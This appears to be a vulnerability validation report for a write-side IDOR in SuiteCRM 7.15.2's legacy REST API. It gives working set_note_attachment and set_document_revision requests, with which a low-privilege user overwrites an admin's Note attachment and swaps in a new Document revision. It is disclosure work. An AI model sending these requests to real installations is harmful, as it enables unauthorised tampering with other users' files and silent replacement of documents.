# VULN-079 — Legacy `set_note_attachment`/`set_document_revision`: write-side IDOR

**Software**: SuiteCRM
**Repository**: https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (suitecrm_version.php) — commit-pinned forkedSuite snapshot
**Status**: CONFIRMED
**Severity (static)**: Medium (CVSS 3.1 5.4 — `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L`)
**Target commit**: 62effd0ceb767ed3b634ade585b19a6633eb4fcb
**Validated at**: see `run.log`

## Preconditions
- Ordinary low-priv user `mod_4dbb3a45` (id `8c661ebf-b068-479c-b5ba-29505fbc403e`) — **zero**
  special Role/ACL setup; the bug requires none.
- Part A: admin-owned Note `6387cd56-ae24-4b8e-950c-4ad6ede69680` with an original attachment
  (`ORIGINAL-OWNER-CONTENT-orig_64678735`), independently confirmed on the app container's disk
  before the attack.
- Part B: admin-owned Document `9b67caf2-b11a-4b51-b8ad-e8d55dfc59a7` with an original revision
  `0d36bd9f-9124-4cfe-8c5a-b89a204c0529` (content `ORIGINAL-DOCUMENT-CO...`), `documents.
  document_revision_id` confirmed pointing at it before the attack.

## Request
Part A decisive request (`request.http`):
```
POST /service/v4_1/rest.php
method=set_note_attachment&input_type=JSON&response_type=JSON&rest_data=
  ["<low-priv session>",{"id":"6387cd56-ae24-4b8e-950c-4ad6ede69680","filename":"pwned.txt",
    "file":"<base64 ATTACKER-OVERWRITE-atk_2cf4b670>"}]
```
Note: **no** `related_module_id`/`related_module_name` supplied — the gate is pure session-only.

Part B decisive request:
```
method=set_document_revision&rest_data=
  ["<low-priv session>",{"id":"9b67caf2-b11a-4b51-b8ad-e8d55dfc59a7","revision":"2",
    "filename":"malicious.txt","file":"<base64 ATTACKER-PLANTED-REVISION-atkd_...>"}]
```

## Response
Part A: `{"id":"6387cd56-..."}` (success). **Disk** (`upload/6387cd56-...`) before:
`ORIGINAL-OWNER-CONTENT-orig_64678735`; after: `ATTACKER-OVERWRITE-atk_2cf4b670` (`response.txt`).

Part B: `{"id":"e9d38da9-f066-42b9-afe5-5faa0d61163f"}` (new revision id). **DB**
(`documents.document_revision_id`) before: `0d36bd9f-...` (the original); after:
`e9d38da9-f066-42b9-afe5-5faa0d61163f` (the attacker's new revision) — i.e. the Document's
"what do I download by default" pointer now points at attacker content. Disk read of
`upload/e9d38da9-...` matches the attacker's planted bytes exactly.

## Observation
Both match the static finding precisely: `set_note_attachment` (`SugarWebServiceImpl.php:772-793`)
only checks `'read'` on a **caller-chosen** related module if the caller supplies one — omitting it
entirely (as this test does) collapses the gate to session-only; the Note itself is never loaded
for an ACL check. `set_document_revision` (`:849-864`) passes an **empty** module to
`checkSessionAndModuleAccess`, so it is unconditionally session-only, and `DocumentSoap::saveFile()`
never checks ACL on the parent Document before writing a new revision. **Beyond what the static
finding predicted**: `DocumentSoap::saveFile()` doesn't just add an orphan revision row — it also
executes `$focus->document_revision_id = $revision->id; $focus->save();`, so the attacker's
revision becomes the Document's new **latest-revision pointer**, i.e. what every legitimate viewer
downloads by default from then on. This makes Part B's real-world impact stronger than "a rogue
revision exists somewhere" — it is silently swapped in as the current version.

## Side effects
1 low-priv user, 1 Note (+1 overwritten attachment file), 1 Document (+2 revisions, 1 of them
attacker-planted) — all random-suffixed. No destructive changes to unrelated data.

## Research & references
CWE-639 (IDOR, write side). OWASP WSTG-ATHZ-04:
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
